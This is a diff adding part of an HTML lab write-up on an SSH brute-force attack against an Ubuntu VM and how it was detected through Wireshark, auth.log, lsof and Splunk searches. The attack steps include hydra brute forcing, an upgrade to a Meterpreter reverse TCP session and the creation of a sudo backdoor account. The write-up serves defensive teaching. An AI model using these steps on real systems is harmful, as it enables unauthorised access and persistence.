+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Step 5: Upgrading to a Meterpreter Session</h3>
+      <p>
+        Because the initial shell closed after testing, I re-established access as Session 2 and upgraded it to a full Meterpreter payload via <code>post/multi/manage/shell_to_meterpreter</code> for stable post-exploitation control:
+      </p>
+
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">msfconsole · sessions -u 2</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">msf auxiliary(scanner/ssh/ssh_login) &gt;</span><span class="cmd">sessions -u 2</span></div>
+      </div>
+
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">Meterpreter Upgrade Execution &amp; C2 Handler</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code">[*] Executing 'post/multi/manage/shell_to_meterpreter' on session: [2]
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on <span class="highlight">192.168.133.142:4433</span>
+[*] Sending stage (1079144 bytes) to 192.168.133.132
+[*] <span class="highlight">Meterpreter session 3 opened</span> (192.168.133.142:4433 -&gt; 192.168.133.132:40624) at 2026-10-01 19:57:33 -0400
+[*] Command stager progress: 100.00% (773/773 bytes)</div>
+      </div>
+
+      <!-- Figure 2 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 02 · METERPRETER SESSION UPGRADE
+          </span>
+          <span class="cs-figure-meta">kali_meterpreter_upgrade.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/kali_meterpreter_upgrade.png" alt="Meterpreter Session Upgrade" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 2:</strong> Upgrading raw shell session 2 to full Meterpreter reverse TCP payload via <code>post/multi/manage/shell_to_meterpreter</code>.
+        </figcaption>
+      </figure>
+
+      <div class="cs-table-wrap">
+        <table class="cs-table">
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>Action</th>
+              <th>Tool / Command</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Recon</strong></td>
+              <td>Scanned target for open SSH on port 22</td>
+              <td><code>nmap -sV -p 22</code></td>
+            </tr>
+            <tr>
+              <td><strong>Brute Force</strong></td>
+              <td>Discovered credentials <code>ubuntu:sudosu</code></td>
+              <td><code>hydra -l ubuntu -P password.txt</code></td>
+            </tr>
+            <tr>
+              <td><strong>Initial Access</strong></td>
+              <td>Validated access and created interactive session</td>
+              <td>Metasploit <code>auxiliary/scanner/ssh/ssh_login</code></td>
+            </tr>
+            <tr>
+              <td><strong>Discovery</strong></td>
+              <td>Fingerprinted OS version and local users</td>
+              <td><code>whoami</code>, <code>/etc/os-release</code>, <code>/etc/passwd</code></td>
+            </tr>
+            <tr>
+              <td><strong>Persistence</strong></td>
+              <td>Created backdoor user account <code>hacker</code></td>
+              <td><code>sudo useradd hacker</code></td>
+            </tr>
+            <tr>
+              <td><strong>Privilege Escalation</strong></td>
+              <td>Elevated <code>hacker</code> account to <code>sudo</code> group</td>
+              <td><code>sudo usermod -aG sudo hacker</code></td>
+            </tr>
+            <tr>
+              <td><strong>C2 Upgrade</strong></td>
+              <td>Upgraded raw shell to Meterpreter</td>
+              <td><code>post/multi/manage/shell_to_meterpreter</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- ========================================================
+         PHASE 02: DETECT (DEFENSIVE BLUE TEAM INVESTIGATION)
+         ======================================================== -->
+    <div class="phase-banner phase-banner-det">
+      <div class="phase-header">
+        <span class="phase-tag">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+          PHASE 02 · DEFENSIVE INVESTIGATION
+        </span>
+        <span class="phase-role">BLUE TEAM / SOC ANALYST</span>
+      </div>
+      <div class="phase-title">Multi-Layer Threat Hunting &amp; Forensic Triage</div>
+      <div class="phase-desc">
+        Reconstructing the attack across 3 independent telemetry tiers: verifying transport velocity at the packet layer (Wireshark), auditing authentication and privileged execution at the host operating system layer (auth.log), and correlating enterprise threat detections in real-time (Splunk SIEM).
+      </div>
+      <div class="phase-pipeline">
+        <span class="pipeline-step">Layer 1: Network (Wireshark)</span>
+        <span class="pipeline-arrow">➔</span>
+        <span class="pipeline-step">Layer 2: Host (auth.log)</span>
+        <span class="pipeline-arrow">➔</span>
+        <span class="pipeline-step">Layer 3: SIEM (Splunk Enterprise)</span>
+      </div>
+    </div>
+
+    <!-- 03 LAYER 1: WIRESHARK PACKET ANALYSIS -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">03</span>
+        <span class="phase-badge phase-badge-det">DETECT · LAYER 1</span>
+        <h2>Part 2 · Layer 1: Network Traffic Analysis (Wireshark)</h2>
+      </div>
+      <p>
+        During the attack, I captured traffic on the target interface (<code>ens33</code>) into <code>ssh_wireshark.pcapng</code> and examined the capture in Wireshark.
+      </p>
+
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">Wireshark Frame Dissection · Packet 616</span>
+          <span class="terminal-badge terminal-badge-log">PCAP DISSECTION</span>
+        </div>
+        <div class="terminal-code">Transmission Control Protocol, Src Port: 22, Dst Port: 45066, Seq: 0, Ack: 1, Len: 0
+Flags: 0x012 (SYN, ACK)
+[Expert Info (Chat/Sequence): Connection establish acknowledge (SYN+ACK): server port 22]
+Window: 64240
+No.: 616 · Time: 38.245219127 · Source: 192.168.133.132 · Destination: 192.168.133.142
+Protocol: TCP · Length: 58 · Info: 22 → 45066 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460</div>
+      </div>
+
+      <!-- Figure 3 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 03 · WIRESHARK PACKET 616 DISSECTION
+          </span>
+          <span class="cs-figure-meta">wireshark_packet616.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/wireshark_packet616.png" alt="Wireshark Packet 616 TCP Handshake" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 3:</strong> Wireshark packet capture inspecting Packet 616 — TCP 3-way handshake SYN+ACK from target <code>192.168.133.132</code> to attacker <code>192.168.133.142</code>.
+        </figcaption>
+      </figure>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          What Wireshark Revealed (Packet Analysis Results)
+        </div>
+        <ul>
+          <li><strong>Connection Flood:</strong> A rapid flood of TCP three-way handshakes to port 22 initiated by <code>192.168.133.142</code>.</li>
+          <li><strong>Ephemeral Port Velocity:</strong> Multiple ephemeral source ports opening short-lived TCP streams in quick succession—a clear footprint of automated brute-force tools.</li>
+        </ul>
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+          The Critical Limitation of Network-Only Inspection
+        </div>
+        <p>
+          Because modern SSH uses encrypted payloads after the initial handshake, <strong>Wireshark could not reveal usernames, attempted passwords, or executed commands</strong>. Network traffic confirmed <em>when</em> and <em>from where</em> connections occurred, but host-level visibility was required to understand the true impact.
+        </p>
+      </div>
+    </section>
+
+    <!-- 04 LAYER 2: HOST FORENSICS (UBUNTU) -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">04</span>
+        <span class="phase-badge phase-badge-det">DETECT · LAYER 2</span>
+        <h2>Part 2 · Layer 2: Host-Level Log Triage (Ubuntu auth.log)</h2>
+      </div>
+      <p>
+        Next, I investigated local system logs in real time to reconstruct the exact failure sequence, rate-limiting penalties, successful access, and backdoor provisioning:
+      </p>
+
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">ubuntu@ubuntu:~$ tail -f /var/log/auth.log</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">ubuntu@ubuntu:~$</span><span class="cmd">sudo tail -f /var/log/auth.log</span></div>
+      </div>
+
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">1. Failed Logins &amp; Built-In Rate-Limiting Throttling</h3>
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">/var/log/auth.log · Rate-Limiting Penalty Stream</span>
+          <span class="terminal-badge terminal-badge-log">LOG STREAM</span>
+        </div>
+        <div class="terminal-code log-stream">
+          <div class="log-line log-line-fail">
+            <span class="log-tag log-tag-fail">FAILED AUTH</span>
+            <div class="log-body"><span class="log-proc">sshd-session[5249]:</span> Failed password for <span class="highlight">ubuntu</span> from <span class="log-ip-src">192.168.133.142</span> port 39512</div>
+          </div>
+          <div class="log-line log-line-fail">
+            <span class="log-tag log-tag-fail">FAILED AUTH</span>
+            <div class="log-body"><span class="log-proc">sshd-session[5250]:</span> Failed password for <span class="highlight">ubuntu</span> from <span class="log-ip-src">192.168.133.142</span> port 39510</div>
+          </div>
+          <div class="log-line log-line-fail">
+            <span class="log-tag log-tag-fail">FAILED AUTH</span>
+            <div class="log-body"><span class="log-proc">sshd-session[5393]:</span> Failed password for <span class="highlight">ubuntu</span> from <span class="log-ip-src">192.168.133.142</span> port 33554 ssh2</div>
+          </div>
+          <div class="log-line log-line-warn">
+            <span class="log-tag log-tag-warn">PENALTY ACTIVE</span>
+            <div class="log-body"><span class="log-proc">sshd[5090]:</span> <span class="log-penalty">srclimit_penalise: 192.168.133.142/32: activating ipv4 penalty of 17 seconds for penalty: failed authentication</span></div>
+          </div>
+          <div class="log-line log-line-drop">
+            <span class="log-tag log-tag-drop">CONN DROPPED</span>
+            <div class="log-body"><span class="log-proc">sshd[5090]:</span> <span class="highlight-err">drop connection #13 from [<span class="log-ip-src">192.168.133.142</span>]:57590 on [<span class="log-ip-dst">192.168.133.132</span>]:22 penalty: failed authentication</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Figure 4 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 04 · UBUNTU AUTH.LOG LIVE TRIAGE
+          </span>
+          <span class="cs-figure-meta">ubuntu_auth_log.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/ubuntu_auth_log.png" alt="Ubuntu auth.log Live Triage" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 4:</strong> Ubuntu <code>/var/log/auth.log</code> live triage showing failed password attempts, <code>srclimit_penalise</code> penalty activation of 17 seconds, and dropped connection events.
+        </figcaption>
+      </figure>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Key Takeaway: Built-In OpenSSH Rate Limiting vs. Fail2ban
+        </div>
+        <p>
+          Notice <code>srclimit_penalise</code> and <code>drop connection</code>. Modern OpenSSH packages on Ubuntu activate per-source connection throttling after consecutive failures. While this imposed delay penalties (17 seconds in this log), <strong>it did not ban the IP completely</strong>, allowing Hydra to easily absorb delays and ultimately succeed.
+        </p>
+      </div>
+
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">2. The Successful Authentication</h3>
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">/var/log/auth.log · Accepted Credentials</span>
+          <span class="terminal-badge terminal-badge-log">LOG STREAM</span>
+        </div>
+        <div class="terminal-code log-stream">
+          <div class="log-line log-line-pass">
+            <span class="log-tag log-tag-pass">ACCEPTED AUTH</span>
+            <div class="log-body"><span class="log-proc">sshd-session[5394]:</span> <span class="highlight">Accepted password for ubuntu from <span class="log-ip-src">192.168.133.142</span> port 33568 ssh2</span></div>
+          </div>
+          <div class="log-line log-line-pass">
+            <span class="log-tag log-tag-pass">SESSION OPEN</span>
+            <div class="log-body"><span class="log-proc">sshd-session[5394]:</span> pam_unix(sshd:session): session opened for user <span class="highlight">ubuntu(uid=1000)</span> by ubuntu(uid=0)</div>
+          </div>
+          <div class="log-line log-line-pass">
+            <span class="log-tag log-tag-pass">TTY ALLOCATED</span>
+            <div class="log-body"><span class="log-proc">systemd-logind[1202]:</span> New session '5' of user <span class="highlight">'ubuntu'</span> with class 'user' and type 'tty'.</div>
+          </div>
+        </div>
+      </div>
+
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">3. Post-Exploitation Account Creation &amp; Sudo Auditing</h3>
+      <p>
+        Because the attacker executed privileged tasks via <code>sudo</code>, every single command was recorded in plaintext by the PAM/sudo facility:
+      </p>
+
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">/var/log/auth.log · Plaintext Sudo Command Audit</span>
+          <span class="terminal-badge terminal-badge-log">LOG STREAM</span>
+        </div>
+        <div class="terminal-code log-stream">
+          <div class="log-line log-line-pass">
+            <span class="log-tag log-tag-pass">PAM ROOT</span>
+            <div class="log-body"><span class="log-proc">sudo:</span> pam_unix(sudo:session): session opened for user root(uid=0) by ubuntu(uid=1000)</div>
+          </div>
+          <div class="log-line log-line-warn">
+            <span class="log-tag log-tag-warn">SUDO EXEC</span>
+            <div class="log-body"><span class="log-proc">sudo:</span> ubuntu : TTY=/dev/pts/2 ; PWD=/home/ubuntu ; USER=root ; <span class="cmd">COMMAND=/usr/sbin/useradd hacker</span></div>
+          </div>
+          <div class="log-line log-line-warn">
+            <span class="log-tag log-tag-warn">USER PROVISION</span>
+            <div class="log-body"><span class="log-proc">useradd[5673]:</span> new group: name=hacker, GID=1002</div>
+          </div>
+          <div class="log-line log-line-warn">
+            <span class="log-tag log-tag-warn">USER PROVISION</span>
+            <div class="log-body"><span class="log-proc">useradd[5673]:</span> new user: name=hacker, UID=1002, GID=1002, home=/home/hacker, shell=/bin/sh, from=/dev/pts/3</div>
+          </div>
+          <div class="log-line log-line-drop">
+            <span class="log-tag log-tag-drop">PRIV ESC</span>
+            <div class="log-body"><span class="log-proc">sudo:</span> ubuntu : TTY=/dev/pts/2 ; PWD=/home/ubuntu ; USER=root ; <span class="cmd">COMMAND=/usr/sbin/usermod -aG sudo hacker</span></div>
+          </div>
+          <div class="log-line log-line-drop">
+            <span class="log-tag log-tag-drop">GROUP ADD</span>
+            <div class="log-body"><span class="log-proc">usermod[5705]:</span> add 'hacker' to group 'sudo'</div>
+          </div>
+          <div class="log-line log-line-drop">
+            <span class="log-tag log-tag-drop">SHADOW ADD</span>
+            <div class="log-body"><span class="log-proc">usermod[5705]:</span> add 'hacker' to shadow group 'sudo'</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Figure 5 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 05 · POST-EXPLOITATION AUTH.LOG AUDIT
+          </span>
+          <span class="cs-figure-meta">ubuntu_post_exploitation_auth_log.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/ubuntu_post_exploitation_auth_log.png" alt="Post-Exploitation Account Creation & Privilege Escalation in auth.log" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 5:</strong> Post-exploitation account creation (<code>useradd hacker</code>) and privilege escalation (<code>usermod -aG sudo hacker</code>) recorded in plaintext within Ubuntu <code>/var/log/auth.log</code>.
+        </figcaption>
+      </figure>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Forensic Breakdown of this Log Evidence (3-Step TTP Analysis)
+        </div>
+        <ul>
+          <li><strong>Step 1 (User Creation):</strong> At <code>17:51:22</code>, user <code>ubuntu</code> used <code>sudo</code> from terminal <code>/dev/pts/2</code> to execute <code>/usr/sbin/useradd hacker</code>. Process ID <code>5673</code> first generated group <code>hacker</code> (<code>GID=1002</code>), then initialized user profile <code>hacker</code> (<code>UID=1002</code>) with home folder <code>/home/hacker</code>.</li>
+          <li><strong>Step 2 (Privilege Escalation):</strong> At <code>17:53:47</code>, the attacker executed <code>/usr/sbin/usermod -aG sudo hacker</code>. Process ID <code>5705</code> added <code>hacker</code> to both the primary and shadow <code>sudo</code> groups, granting root rights.</li>
+          <li><strong>Step 3 (Failed Lateral Movement):</strong> Notice subsequent <code>unix_chkpwd</code> and <code>FAILED SU (to hacker)</code> entries in Figure 5 at <code>17:55:09</code> to <code>17:56:04</code>. These reflect the attacker repeatedly guessing passwords (<code>sudosu</code>, <code>sudosu1</code>) trying to switch directly into the new <code>hacker</code> shell before switching back to <code>sudo su -hacker</code>.</li>
+        </ul>
+      </div>
+
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">4. Correlating Active Sockets with lsof</h3>
+      <p>To identify active connections tied to the attacker, I ran:</p>
+
+      <div class="terminal-block terminal-cmd-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">ubuntu@ubuntu:~$ sudo lsof -i :22</span>
+          <span class="terminal-badge terminal-badge-cmd">CLI COMMAND</span>
+        </div>
+        <div class="terminal-code"><span class="terminal-prompt">ubuntu@ubuntu:~$</span><span class="cmd">sudo lsof -i :22</span></div>
+      </div>
+
+      <div class="terminal-block terminal-out-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">Active Sockets on Port 22 (SSH)</span>
+          <span class="terminal-badge terminal-badge-out">STDOUT</span>
+        </div>
+        <div class="terminal-code">COMMAND     PID  USER    FD   TYPE DEVICE SIZE/OFF NODE NAME
+systemd       1  root  141u  IPv4  29798      0t0  TCP *:ssh (LISTEN)
+systemd       1  root  142u  IPv6  29101      0t0  TCP *:ssh (LISTEN)
+sshd       5090  root    3u  IPv4  29798      0t0  TCP *:ssh (LISTEN)
+sshd       5090  root    4u  IPv6  29101      0t0  TCP *:ssh (LISTEN)
+sshd-sess  8533  root    9u  IPv4  67166      0t0  TCP <span class="highlight">ubuntu:ssh-&gt;192.168.133.142:44785 (ESTABLISHED)</span>
+sshd-sess  8569 ubuntu    9u  IPv4  67166      0t0  TCP ubuntu:ssh-&gt;192.168.133.142:44785 (ESTABLISHED)</div>
+      </div>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Active Socket Correlation Results
+        </div>
+        <p>
+          The established socket on port <code>44785</code> tied directly back to <code>Accepted password for ubuntu from 192.168.133.142 port 44785 ssh2</code> in <code>auth.log</code>, linking the live socket directly to the logged authentication event.
+        </p>
+      </div>
+    </section>
+
+    <!-- 05 LAYER 3: SPLUNK SIEM THREAT HUNTING -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">05</span>
+        <span class="phase-badge phase-badge-det">DETECT · LAYER 3</span>
+        <h2>Part 2 · Layer 3: Centralized Threat Hunting (Splunk Enterprise)</h2>
+      </div>
+      <p>
+        On the Windows 11 host, I opened Splunk Enterprise to query the forwarded dataset (<code>index=main host="ubuntu"</code>) and build actionable SPL threat hunts.
+      </p>
+
+      <!-- Search 1 -->
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Search 1: Extracting Attacker IP and Session Ports with rex</h3>
+      <p>
+        Because <code>/var/log/auth.log</code> is unstructured text, fields like source IP and ephemeral port are not indexed out of the box. I wrote a regular expression with Splunk's <code>rex</code> command to parse these fields on the fly:
+      </p>
+
+      <div class="splunk-box">
+        <div class="splunk-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          SPL Hunt 01 · Accepted Logins &amp; rex Extraction
+        </div>
+        <div class="splunk-query"><span class="kw">index</span>=main <span class="kw">host</span>="ubuntu" <span class="kw">source</span>="/var/log/auth.log" "accepted"
+<span class="pipe">|</span> <span class="kw">rex</span> field=_raw "from (?&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+) port (?&lt;port&gt;\d+)"
+<span class="pipe">|</span> <span class="kw">table</span> _time, src_ip, port, _raw
+<span class="pipe">|</span> <span class="kw">sort</span> - _time</div>
+      </div>
+
+      <!-- Figure 6 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 06 · SPLUNK ACCEPTED SSH LOGINS SEARCH
+          </span>
+          <span class="cs-figure-meta">splunk_ssh_logins.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/splunk_ssh_logins.png" alt="Splunk SSH Accepted Logins" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 6:</strong> Splunk search parsing <code>/var/log/auth.log</code> with dynamic regex extractions, isolating 33 accepted sessions and mapping ephemeral source ports.
+        </figcaption>
+      </figure>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Forensic Evidence Uncovered (Search 1 Results)
+        </div>
+        <ul>
+          <li><strong>33 total events</strong> matched in the 24-hour investigation window.</li>
+          <li><strong>Single Source IP:</strong> Every single authenticated session originated from <code>src_ip = 192.168.133.142</code> (the Kali attacker).</li>
+          <li><strong>Ephemeral Port Sequencing:</strong> The query captured connections across 10 distinct source ports (<code>44785</code>, <code>53092</code>, <code>33673</code>, <code>37447</code>, <code>54530</code>, <code>33568</code>, <code>39540</code>, <code>33505</code>, <code>51518</code>, <code>50244</code>), correlating directly with each new SSH session opened during the attack.</li>
+        </ul>
+      </div>
+
+      <!-- Search 2 -->
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Search 2: Hunting Account Creation (new user / useradd)</h3>
+      <p>To detect potential backdoor accounts, I searched for user creation activity across the logs:</p>
+
+      <div class="splunk-box">
+        <div class="splunk-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          SPL Hunt 02 · User Creation Detection
+        </div>
+        <div class="splunk-query"><span class="kw">index</span>=main <span class="kw">host</span>="ubuntu" <span class="kw">source</span>="/var/log/auth.log" (new user OR useradd)
+<span class="pipe">|</span> <span class="kw">table</span> _time, _raw</div>
+      </div>
+
+      <!-- Figure 7 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 07 · SPLUNK USER CREATION SEARCH
+          </span>
+          <span class="cs-figure-meta">splunk_useradd_hacker.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/splunk_useradd_hacker.png" alt="Splunk User Creation Search" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 7:</strong> Splunk search identifying <code>useradd</code> and <code>new user</code> activity, isolating the malicious <code>hacker</code> account provisioning event.
+        </figcaption>
+      </figure>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Forensic Evidence Uncovered (Search 2 Results)
+        </div>
+        <ul>
+          <li><strong>Returned 91 events total.</strong> While much of this included background noise from <code>systemd-logind</code> session lifecycle events (<code>class 'user'</code>, <code>type 'wayland'</code>, <code>type 'tty'</code>), filtering by <code>useradd</code> pinpointed the malicious account creation:</li>
+        </ul>
+        <div class="terminal-block terminal-out-block" style="margin:12px 0;">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+            <span class="terminal-title">auth.log · Isolated useradd Provisioning Event</span>
+            <span class="terminal-badge terminal-badge-log">RAW SYSLOG</span>
+          </div>
+          <div class="terminal-code" style="font-size:12px;">2026-10-02T17:51:22.900911+05:30 ubuntu useradd[5673]: <span class="highlight">new user: name=hacker, UID=1002, GID=1002, home=/home/hacker, shell=/bin/sh, from=/dev/pts/3</span>
+2026-10-02T17:51:22.892929+05:30 ubuntu useradd[5673]: new group: name=hacker, GID=1002</div>
+        </div>
+        <p>
+          This proved that a brand-new local account (<code>hacker</code>) was provisioned directly from an interactive pseudo-terminal (<code>/dev/pts/3</code>) shortly after the initial SSH compromise.
+        </p>
+      </div>
+
+      <!-- Search 3 -->
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Search 3: Tracking Group Membership &amp; Privilege Escalation</h3>
+      <p>Next, I hunted for group modifications to see if any accounts were being elevated to administrative groups:</p>
+
+      <div class="splunk-box">
+        <div class="splunk-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          SPL Hunt 03a · Baseline vs. Malicious Group Modifications
+        </div>
